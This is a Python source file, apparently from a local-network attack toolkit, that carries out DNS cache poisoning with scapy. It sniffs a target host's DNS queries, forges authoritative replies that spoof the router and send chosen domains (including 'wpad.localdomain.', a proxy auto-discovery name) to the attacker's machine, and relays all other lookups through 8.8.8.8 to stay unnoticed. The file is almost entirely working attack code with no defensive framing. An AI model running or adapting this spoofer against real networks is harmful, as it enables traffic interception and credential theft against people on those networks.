import os
import logging as log
import platform
import threading
import time
from tabnanny import verbose

from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, IP, UDP, DNSQR

from utils import thread_with_trace
from networking_functions import get_local_ip

from colorama import init, Fore

init()
GREEN = Fore.GREEN
BLUE = Fore.BLUE
RED = Fore.RED
RESET = Fore.RESET

local_ip = get_local_ip()

hosts_dict = {
    # "facebook.com.": local_ip,
    "something.hello.": local_ip,
    "wpad.localdomain.": local_ip,
    # "1.2.168.192.in-addr.arpa.": local_ip
}

domains = hosts_dict.keys()


def forge_packet_better(packet_to_forge, target_ip, router_ip, printing_queue, verbosity):
    if verbosity > 1:
        printing_queue.put(packet_to_forge)

    original_qname = packet_to_forge[DNSQR].qname.decode('UTF-8')
    # original_qname = packet_to_forge[DNS].qd.qname.decode('UTF-8')

    if verbosity > 0:
        printing_queue.put(f"{GREEN}[+] Dns with: "+ original_qname + f" arrived{RESET}")
    if str(original_qname) in domains:
        if verbosity > 0:
            printing_queue.put(f"{BLUE}[?]DETECTED DNS TO FORGE{RESET}")
        fake_dns_packet = IP()/UDP()/DNS()/DNSRR()

        fake_dns_packet[IP].src = router_ip
        fake_dns_packet[IP].dst = target_ip

        fake_dns_packet[UDP].sport = 53
        fake_dns_packet[UDP].dport = packet_to_forge[UDP].sport

        fake_dns_packet[DNS].id = packet_to_forge[DNS].id
        fake_dns_packet[DNS].qd = packet_to_forge.qd
        fake_dns_packet[DNS].aa = 1
        fake_dns_packet[DNS].qr = 1
        fake_dns_packet[DNS].ancount = 1

        fake_dns_packet[DNSRR].qname = packet_to_forge[DNSQR].qname
        fake_dns_packet[DNSRR].rrname = packet_to_forge[DNSQR].qname
        fake_dns_packet[DNSRR].rdata = local_ip

        if verbosity > 0:
            printing_queue.put(f"{GREEN}[+]Sending spoofed DNS packet: {original_qname} = {local_ip}{RESET}")
        send(fake_dns_packet, verbose=0)
    else:
        forward_packet = IP() / UDP() / DNS()
        forward_packet[IP].dst = '8.8.8.8'
        forward_packet[UDP].sport = packet_to_forge[UDP].sport
        forward_packet[DNS].rd = 1
        forward_packet[DNS].qd = DNSQR(qname=original_qname)

        google_response = sr1(forward_packet, verbose=0)

        response_packet = IP() / UDP() / DNS()
        response_packet[IP].src = local_ip
        response_packet[IP].dst = target_ip
        response_packet[UDP].dport = packet_to_forge[UDP].sport
        response_packet[DNS] = google_response[DNS]

        send(response_packet, verbose=0)


def forge_packet(packet_to_forge, fake_server_ip):
    RR_TTL = 60
    forged_DNSRR = DNSRR(rrname=packet_to_forge[DNS].qd.qname, ttl=RR_TTL, rdlen=4, rdata=fake_server_ip)
    forged_packet = IP(src=packet_to_forge[IP].dst, dst=packet_to_forge[IP].src) / \
                    UDP(sport=packet_to_forge[UDP].dport, dport=packet_to_forge[UDP].sport) / \
                    DNS(id=packet_to_forge[DNS].id, qr=1, aa=1, qd=packet_to_forge[DNS].qd, an=forged_DNSRR)
    return forged_packet


# def process_dns_packet(packet_to_process, target, router_ip):
    # print(packet_to_process[DNS].qd.qname.decode('UTF-8'))
    # print(packet_to_process[IP].src)
    # print(target)
    # current_domain = packet_to_process[DNS].qd.qname.decode('UTF-8')
    # if packet_to_process[IP].src == target:
    #     print("packet of target")
        # forge_packet_better(packet_to_process, target, router_ip)
        #
        # forged_packet = forge_packet(packet_to_process, ip)
        #
        # send(forged_packet, verbose=0)
        # print(
        #     f"[*] Forged DNS response sent. Told {packet_to_process[IP].src} that {packet_to_process[DNS].qd.qname.decode('UTF-8')} was at {ip}")


def start_dns_poisoning(interface_to_listen, target_ip, router_ip, printing_queue, verbosity):
    cancel_token = threading.Event()
    dns_thread = threading.Thread(target=dns_poisoning_loop,
                                  args=(
                                  interface_to_listen, target_ip, router_ip, printing_queue, verbosity, cancel_token))
    dns_thread.start()
    return cancel_token


def dns_poisoning_loop(interface_to_listen, target_ip, router_ip, printing_queue, verbosity, cancel_token):
    if verbosity > 0:
        printing_queue.put(f"{GREEN}[+] Starting dns poisoning loop{RESET}")
    bpf_filter = f'udp dst port 53 and not src host {local_ip} and src host {target_ip}'
    while not cancel_token.is_set():
        sniff(iface=interface_to_listen, prn=lambda pkt: forge_packet_better(pkt, target_ip, router_ip, printing_queue, verbosity), store=0,
              count=1, filter=bpf_filter)

# if __name__ == "__main__":
#     dns_thread_token = start_dns_poisoning("wlan0", "192.168.2.100", 0, 1)
